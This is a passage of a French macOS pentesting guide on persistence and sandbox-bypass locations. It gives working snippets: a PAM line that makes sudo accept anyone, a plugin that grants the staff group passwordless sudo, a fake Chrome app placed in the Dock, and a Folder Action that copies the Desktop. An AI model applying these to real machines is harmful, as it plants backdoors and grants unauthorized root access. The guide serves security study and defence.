Ci-dessus, nous pouvons voir deux tâches planifiées. Nous pouvons afficher les détails de la tâche à l’aide de `at -c JOBNUMBER`.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Si les tâches AT ne sont pas activées, les tâches créées ne seront pas exécutées.

Les **fichiers de tâches** se trouvent dans `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Le nom du fichier contient la queue, le numéro du job et l’heure à laquelle il est planifié. Prenons par exemple `a0001a019bdcd2`.

- `a` - il s’agit de la queue
- `0001a` - numéro du job en hexadécimal, `0x1a = 26`
- `019bdcd2` - heure en hexadécimal. Elle représente le nombre de minutes écoulées depuis l’epoch. `0x019bdcd2` correspond à `26991826` en décimal. En le multipliant par 60, on obtient `1619509560`, soit `GMT: 2021. 27 avril, mardi 7:46:00`.

Si nous affichons le fichier du job, nous constatons qu’il contient les mêmes informations que celles obtenues avec `at -c`.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Utile pour contourner la sandbox : [✅](https://emojipedia.org/check-mark-button)
- Cependant, vous devez pouvoir appeler `osascript` avec des arguments pour contacter **`System Events`** afin de pouvoir configurer les Folder Actions
- TCC bypass : [🟠](https://emojipedia.org/large-orange-circle)
- Il dispose de certaines permissions TCC de base, comme celles concernant Desktop, Documents et Downloads

#### Emplacement

- **`/Library/Scripts/Folder Action Scripts`**
- Root requis
- **Déclencheur** : accès au dossier spécifié
- **`~/Library/Scripts/Folder Action Scripts`**
- **Déclencheur** : accès au dossier spécifié

#### Description & Exploitation

Les Folder Actions sont des scripts automatiquement déclenchés par des modifications apportées à un dossier, comme l’ajout ou la suppression d’éléments, ou d’autres actions telles que l’ouverture ou le redimensionnement de la fenêtre du dossier. Ces actions peuvent être utilisées pour diverses tâches et être déclenchées de différentes manières, par exemple via l’interface utilisateur du Finder ou des commandes du terminal.

Pour configurer les Folder Actions, vous avez plusieurs options :

1. Créer un workflow de Folder Action avec [Automator](https://support.apple.com/guide/automator/welcome/mac) et l’installer en tant que service.
2. Attacher manuellement un script via Folder Actions Setup dans le menu contextuel d’un dossier.
3. Utiliser OSAScript pour envoyer des messages Apple Event à `System Events.app` afin de configurer une Folder Action par programmation.
- Cette méthode est particulièrement utile pour intégrer l’action au système, offrant ainsi un certain niveau de persistence.

Le script suivant est un exemple de ce qui peut être exécuté par une Folder Action :
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Pour rendre le script ci-dessus utilisable par les Folder Actions, compilez-le à l’aide de :
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Après la compilation du script, configurez les Folder Actions en exécutant le script ci-dessous. Ce script activera les Folder Actions globalement et associera spécifiquement le script compilé précédemment au dossier Desktop.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Exécutez le script de configuration avec :
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Voici comment implémenter cette persistence via l'interface graphique :

Voici le script qui sera exécuté :
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Compilez-le avec : `osacompile -l JavaScript -o folder.scpt source.js`

Déplacez-le vers :
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Ensuite, ouvrez l’application `Folder Actions Setup`, sélectionnez le **dossier que vous souhaitez surveiller**, puis sélectionnez dans votre cas **`folder.scpt`** (dans mon cas, je l’ai appelé output2.scp) :

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Désormais, si vous ouvrez ce dossier avec **Finder**, votre script sera exécuté.

Cette configuration était stockée au format base64 dans le **plist** situé à l’emplacement **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**.

Essayons maintenant de préparer cette persistence sans accès à l’interface graphique :

1. **Copiez `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** dans `/tmp` pour en créer une sauvegarde :
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Supprimez** les Folder Actions que vous venez de configurer :

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Maintenant que nous avons un environnement vide :

3. Copiez le fichier de sauvegarde : `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Ouvrez l’application Folder Actions Setup.app pour charger cette configuration : `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Cela n’a pas fonctionné pour moi, mais voici les instructions du writeup :

### Raccourcis du Dock

Writeup : [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Utile pour bypass le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Mais vous devez avoir installé une application malveillante dans le système
- Bypass TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- `~/Library/Preferences/com.apple.dock.plist`
- **Déclencheur** : lorsque l’utilisateur clique sur l’application dans le Dock

#### Description et exploitation

Toutes les applications qui apparaissent dans le Dock sont spécifiées dans le plist : **`~/Library/Preferences/com.apple.dock.plist`**

Il est possible **d’ajouter une application** simplement avec :
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
En utilisant de la **social engineering**, vous pourriez **vous faire passer, par exemple, pour Google Chrome** dans le dock et exécuter votre propre script :
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Utile pour bypass un sandbox : [🟠](https://emojipedia.org/large-orange-circle)
- Une action très spécifique doit se produire
- Vous vous retrouverez dans un autre sandbox
- TCC bypass : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- `/Library/ColorPickers`
- Root requis
- Déclencheur : utiliser le color picker
- `~/Library/ColorPickers`
- Déclencheur : utiliser le color picker

#### Description & Exploit

**Compilez un bundle de color picker** avec votre code (vous pouvez par exemple utiliser [**celui-ci**](https://github.com/viktorstrate/color-picker-plus)) et ajoutez un constructor (comme dans la [section Screen Saver](macos-auto-start-locations.md#screen-saver)), puis copiez le bundle dans `~/Library/ColorPickers`.

Ensuite, lorsque le color picker est déclenché, votre code devrait l'être également.

Notez que le binaire chargeant votre library dispose d'un **sandbox très restrictif** : `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Utile pour contourner la sandbox : **Non, car vous devez exécuter votre propre application**
- TCC bypass : ???

#### Emplacement

- Une application spécifique

#### Description & Exploit

Un exemple d’application avec une Finder Sync Extension [**peut être trouvé ici**](https://github.com/D00MFist/InSync).

Les applications peuvent avoir des `Finder Sync Extensions`. Cette extension sera intégrée à une application qui sera exécutée. De plus, pour que l’extension puisse exécuter son code, elle **doit être signée** avec un certificat Apple developer valide, elle doit être **sandboxed** (bien que des exceptions plus permissives puissent être ajoutées) et elle doit être enregistrée avec quelque chose comme :
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Économiseur d’écran

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Utile pour bypass le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
- Mais vous finirez dans un sandbox d’application courant
- TCC bypass : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- `/System/Library/Screen Savers`
- Root requis
- **Déclencheur** : Sélectionner l’économiseur d’écran
- `/Library/Screen Savers`
- Root requis
- **Déclencheur** : Sélectionner l’économiseur d’écran
- `~/Library/Screen Savers`
- **Déclencheur** : Sélectionner l’économiseur d’écran

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Description et exploit

Créez un nouveau projet dans Xcode et sélectionnez le template pour générer un nouvel **économiseur d’écran**. Ajoutez ensuite votre code, par exemple le code suivant pour générer des logs.

**Build** le projet, puis copiez le bundle `.saver` dans **`~/Library/Screen Savers`**. Ensuite, ouvrez l’interface graphique de l’économiseur d’écran et cliquez simplement dessus : cela devrait générer beaucoup de logs :
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Notez que, puisque vous pouvez trouver **`com.apple.security.app-sandbox`** dans les entitlements du binaire qui charge ce code (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), vous serez **à l'intérieur du sandbox applicatif commun**.

Code du screensaver :
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Plugins Spotlight

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Utile pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
- Mais vous finirez dans un application sandbox
- TCC bypass : [🔴](https://emojipedia.org/large-red-circle)
- Le sandbox semble très limité

#### Emplacement

- `~/Library/Spotlight/`
- **Déclencheur** : un nouveau fichier dont l’extension est gérée par le plugin Spotlight est créé.
- `/Library/Spotlight/`
- **Déclencheur** : un nouveau fichier dont l’extension est gérée par le plugin Spotlight est créé.
- Root requis
- `/System/Library/Spotlight/`
- **Déclencheur** : un nouveau fichier dont l’extension est gérée par le plugin Spotlight est créé.
- Root requis
- `Some.app/Contents/Library/Spotlight/`
- **Déclencheur** : un nouveau fichier dont l’extension est gérée par le plugin Spotlight est créé.
- Nouvelle app requise

#### Description et exploitation

Spotlight est la fonctionnalité de recherche intégrée à macOS, conçue pour fournir aux utilisateurs un **accès rapide et complet aux données présentes sur leurs ordinateurs**.\
Pour permettre cette capacité de recherche rapide, Spotlight gère une **base de données propriétaire** et crée un index en **analysant la plupart des fichiers**, ce qui permet d’effectuer rapidement des recherches à la fois dans les noms de fichiers et dans leur contenu.

Le mécanisme sous-jacent de Spotlight repose sur un processus central nommé « mds », qui signifie **« metadata server »**. Ce processus orchestre l’ensemble du service Spotlight. En complément, plusieurs daemons « mdworker » effectuent diverses tâches de maintenance, telles que l’indexation de différents types de fichiers (`ps -ef | grep mdworker`). Ces tâches sont rendues possibles par les plugins d’importation Spotlight, ou **« bundles .mdimporter »**, qui permettent à Spotlight de comprendre et d’indexer le contenu d’une grande variété de formats de fichiers.

Les plugins ou bundles **`.mdimporter`** se trouvent aux emplacements mentionnés précédemment et, si un nouveau bundle apparaît, il est chargé en moins d’une minute (aucun redémarrage de service n’est nécessaire). Ces bundles doivent indiquer **les types de fichiers et les extensions qu’ils peuvent gérer** ; ainsi, Spotlight les utilisera lorsqu’un nouveau fichier possédant l’extension indiquée est créé.

Il est possible de **trouver tous les `mdimporters`** chargés en exécutant :
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Et par exemple, **/Library/Spotlight/iBooksAuthor.mdimporter** est utilisé pour analyser ce type de fichiers (entre autres, les extensions `.iba` et `.book`) :
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Si vous vérifiez le Plist d'autres `mdimporter`, vous pourriez ne pas trouver l'entrée **`UTTypeConformsTo`**. C'est parce qu'il s'agit d'un _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) intégré et qu'il n'a pas besoin de spécifier d'extensions.
>
> De plus, les plugins par défaut du système sont toujours prioritaires. Un attaquant ne peut donc accéder qu'aux fichiers qui ne sont pas indexés par les propres `mdimporters` d'Apple.

Pour créer votre propre importer, vous pouvez commencer avec ce projet : [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), puis modifier le nom, **`CFBundleDocumentTypes`** et ajouter **`UTImportedTypeDeclarations`** afin qu'il prenne en charge l'extension souhaitée, puis les référencer dans **`schema.xml`**.\
Ensuite, **modifiez** le code de la fonction **`GetMetadataForFile`** afin d'exécuter votre payload lorsqu'un fichier avec l'extension traitée est créé.

Enfin, **compilez et copiez votre nouveau `.mdimporter`** dans l'un des trois emplacements précédents. Vous pouvez ensuite vérifier quand il est chargé en **surveillant les logs** ou en vérifiant **`mdimport -L.`**

### ~~Preference Pane~~

> [!CAUTION]
> Cela ne semble plus fonctionner.

Writeup : [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Utile pour bypass la sandbox : [🟠](https://emojipedia.org/large-orange-circle)
- Nécessite une action spécifique de l'utilisateur
- TCC bypass : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

Cela ne semble plus fonctionner.

## Root Sandbox Bypass

> [!TIP]
> Vous trouverez ici des start locations utiles pour le **sandbox bypass**, permettant d'exécuter simplement quelque chose en **l'écrivant dans un fichier** en étant **root** et/ou en nécessitant d'autres **conditions inhabituelles.**

### Periodic

Writeup : [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Utile pour bypass la sandbox : [🟠](https://emojipedia.org/large-orange-circle)
- Mais vous devez être root
- TCC bypass : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root requis
- **Déclencheur** : lorsque le moment arrive
- `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local`
- Root requis
- **Déclencheur** : lorsque le moment arrive

#### Description & Exploitation

Les scripts periodic (**`/etc/periodic`**) sont exécutés à cause des **launch daemons** configurés dans `/System/Library/LaunchDaemons/com.apple.periodic*`. Notez que les scripts stockés dans `/etc/periodic/` sont **exécutés** avec les privilèges du **propriétaire du fichier**, ce qui ne fonctionnera donc pas pour une éventuelle élévation de privilèges.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
D'autres scripts périodiques qui seront exécutés sont indiqués dans **`/etc/defaults/periodic.conf`** :
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Si vous parvenez à écrire dans l'un des fichiers `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local`, il sera **exécuté tôt ou tard**.

> [!WARNING]
> Notez que le script periodic sera **exécuté avec les privilèges du propriétaire du script**. Ainsi, si un utilisateur standard possède le script, celui-ci sera exécuté avec les privilèges de cet utilisateur (ce qui peut empêcher les attaques d'escalade de privilèges).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Utile pour bypasser le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
- Mais vous devez être root
- TCC bypass : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- Root toujours requis

#### Description & Exploitation

Comme PAM se concentre davantage sur la **persistence** et les malwares que sur l'exécution facile à l'intérieur de macOS, ce blog ne fournira pas d'explication détaillée ; **consultez les writeups pour mieux comprendre cette technique**.

Vérifiez les modules PAM avec :
```bash
ls -l /etc/pam.d
```
Une technique de persistence/élévation de privilèges exploitant PAM consiste simplement à modifier le module `/etc/pam.d/sudo` en ajoutant la ligne suivante au début :
```bash
auth       sufficient     pam_permit.so
```
Cela **ressemblera à** quelque chose comme ceci :
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Et par conséquent, toute tentative d'utilisation de **`sudo` fonctionnera**.

> [!CAUTION]
> Notez que ce répertoire est protégé par TCC ; il est donc très probable que l'utilisateur reçoive une invite lui demandant son autorisation.

Un autre exemple intéressant est `su`, où vous pouvez voir qu'il est également possible de fournir des paramètres aux modules PAM (et vous pourriez aussi backdoor ce fichier) :
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Plugins d'autorisation

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Utile pour bypass le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
- Mais vous devez être root et effectuer des configurations supplémentaires
- TCC bypass : ???

#### Emplacement

- `/Library/Security/SecurityAgentPlugins/`
- Les privilèges root sont requis
- Il est également nécessaire de configurer la base de données d'autorisation pour utiliser le plugin

#### Description et exploitation

Vous pouvez créer un plugin d'autorisation qui sera exécuté lorsqu'un utilisateur se connecte afin de maintenir la persistence. Pour plus d'informations sur la création de l'un de ces plugins, consultez les writeups précédents (et soyez prudent : un plugin mal écrit peut vous empêcher de vous connecter et vous devrez nettoyer votre Mac depuis le mode de récupération).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Déplacez** le bundle vers l’emplacement où il sera chargé :
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Enfin, ajoutez la **règle** pour charger ce Plugin :
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Le **`evaluate-mechanisms`** indiquera au framework d’autorisation qu’il devra **appeler un mécanisme externe pour l’autorisation**. De plus, **`privileged`** fera en sorte qu’il soit exécuté par root.

Déclenchez-le avec :
```bash
security authorize com.asdf.asdf
```
Et ensuite, le **groupe staff doit avoir un accès sudo** (lisez `/etc/sudoers` pour le confirmer).

### Man.conf

Compte rendu : [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Utile pour bypasser le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
- Mais vous devez être root et l’utilisateur doit utiliser man
- TCC bypass : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- **`/private/etc/man.conf`**
- Root requis
- **`/private/etc/man.conf`** : chaque fois que man est utilisé

#### Description & Exploit

Le fichier de configuration **`/private/etc/man.conf`** indique le binaire/script à utiliser lors de l’ouverture des fichiers de documentation de man. Ainsi, le chemin vers l’exécutable pourrait être modifié afin qu’à chaque fois que l’utilisateur utilise man pour lire de la documentation, un backdoor soit exécuté.

Par exemple, définir dans **`/private/etc/man.conf`** :
```
MANPAGER /tmp/view
```
Puis créez `/tmp/view` comme suit :
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Utile pour contourner la sandbox : [🟠](https://emojipedia.org/large-orange-circle)
- Mais vous devez être root et Apache doit être en cours d’exécution
- TCC bypass : [🔴](https://emojipedia.org/large-red-circle)
- Httpd n’a pas d’entitlements

#### Emplacement

- **`/etc/apache2/httpd.conf`**
- Droits root requis
- Déclencheur : lorsqu’Apache2 est démarré

#### Description et exploit

Vous pouvez indiquer dans `/etc/apache2/httpd.conf` de charger un module en ajoutant une ligne telle que :
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
De cette manière, vos modules compilés seront chargés par Apache. La seule exigence est de **le signer avec un certificat Apple valide**, ou d’**ajouter un nouveau certificat de confiance** au système et de **le signer** avec celui-ci.

Ensuite, si nécessaire, pour vous assurer que le serveur sera démarré, vous pouvez exécuter :
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Exemple de code pour le Dylb :
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### Framework d’audit BSM

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Utile pour bypass le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
- Mais vous devez être root, auditd doit être en cours d’exécution et vous devez provoquer un warning
- TCC bypass : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- **`/etc/security/audit_warn`**
- Root requis
- **Déclencheur** : lorsqu’auditd détecte un warning

